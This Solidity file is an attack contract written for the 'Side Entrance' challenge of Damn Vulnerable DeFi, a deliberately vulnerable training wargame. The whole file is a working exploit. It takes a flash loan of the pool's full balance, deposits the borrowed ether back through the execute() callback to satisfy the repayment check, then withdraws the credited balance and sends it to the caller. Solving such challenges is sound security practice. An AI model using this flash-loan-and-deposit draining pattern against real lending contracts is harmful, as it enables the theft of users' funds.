// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./SideEntranceLenderPool.sol";

// interface SideEntranceLenderPoolAttack {
//     function execute() external payable;
// }

/**
 * @title SideEntranceLenderPool
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 */
contract SideEntranceLenderPoolAttack {
    SideEntranceLenderPool victimPool;
    constructor (SideEntranceLenderPool _victimPool){
victimPool= SideEntranceLenderPool(_victimPool);
    }
    function attack() external {
        victimPool.flashLoan(address(victimPool).balance);
        victimPool.withdraw();
        require(address(this).balance>0,"you got no money");
        (bool success,) = msg.sender.call{value:address(this).balance}("");
        require(success,"attack failed");
        
    }
    function execute() external payable{
        victimPool.deposit{value:msg.value}();
    }
 
   receive() external payable {}


}
